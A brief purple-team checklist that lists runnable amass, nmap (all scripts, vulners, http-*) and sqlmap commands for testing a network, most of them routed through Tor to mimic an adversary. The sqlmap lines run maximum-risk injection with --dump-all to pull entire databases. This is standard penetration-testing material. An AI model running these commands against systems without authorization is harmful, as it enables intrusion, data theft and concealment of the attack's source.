# Purple Team Process (Ver. 1.0):

This guide is for both Red Team and Blue Team, to perform an active and comprehensive scan of your entire network.

Pay attention, this is a real, non desructive attack so you must have the authorization to perform this analysis.

In amass scan, replace %target% with the domain
#### Network Analysis:
- amass enum -v -src -ip -brute -min-for-recursive 2 -d %target%

Take the result and extract IPs.
In nmap scans, replace %targets% with IPs

In sqlmap scans, replace "http://example.com" with the original URL.
Add "/*" without quotes at the end of URL.

If there is "/" at the end of URL, add only "*".

From this step, all scans will be performed through Tor network, to simulate a real Adversary.

If your network/security devices blocks the Tor network, repeat all tests without proxies options.

#### System Analysis:
- nmap -sV --host-timeout 1440m -Pn --script "*" %targets% --proxies SOCKS4://127.0.0.1:9050

#### Advanced System Analysis:
- nmap -sV --host-timeout 1440m -Pn --script vulners %targets% --proxies SOCKS4://127.0.0.1:9050

#### Transport Analysis:
- Perform a Qualys SSL Labs scan

#### Application Analysis:
- nmap -sV --host-timeout 1440m -Pn --script http-sql-injection %targets% --proxies SOCKS4://127.0.0.1:9050

#### Advanced Application Analysis:
- nmap -sV --host-timeout 1440m -Pn --script "http-*" %targets% --proxies SOCKS4://127.0.0.1:9050

#### Extreme Application Analysis (sqlmap - URLs from nmap results):
- sqlmap -u "http://example.com" --crawl=10 --level=5 --risk=3 -a --dump-all --batch --random-agent --tor

- sqlmap -u "http://example.com" --crawl=10 --level=5 --risk=3 -a --dump-all --batch --forms --random-agent --tor

Start both sqlmap scans to perform a double analysis (GET parameters + FORMS scan).
